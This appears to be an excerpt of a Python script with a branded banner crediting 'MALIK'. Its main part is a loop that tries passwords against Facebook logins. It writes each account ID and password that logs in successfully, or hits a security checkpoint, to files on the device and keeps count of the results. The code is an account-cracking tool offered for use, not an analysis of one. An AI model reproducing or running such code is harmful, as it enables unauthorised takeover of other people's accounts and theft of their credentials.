...
\033[0;91m║\033[1;92m➤\033[1;91m Author \033[1;97m：\033[1;93mMALIK \033[1;97m(\x1b[1;32mMALIK\x1b[1;37m)   \033[1;91m				  ║
\033[0;91m║\033[1;92m➤\033[1;91m Github \033[1;97m：\033[1;93mRED-MALIK-BRAND			  \033[1;91m	  ║
\033[0;91m║\033[1;92m➤\033[1;91m Fb ID \033[1;97m ：\033[1;93mMR. MALIK			  \033[1;91m		  ║
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\r\033[1;32m[Malik-OK] '+cid+' | '+ps)
				open('/sdcard/MalikOK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[Malik-CP] '+cid+' | '+ps )
				open('/sdcard/MalikCP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\033[1;97m[ \033[1;91m#Malik\033[1;97m ]\033[1;37m%s/%s|\33[1;97mOK/CP/TL:%s/%s/%s'%(tl,loop,len(oks),len(cps),len(tls))),
		sys.stdout.flush()
	except:
		pass
main()
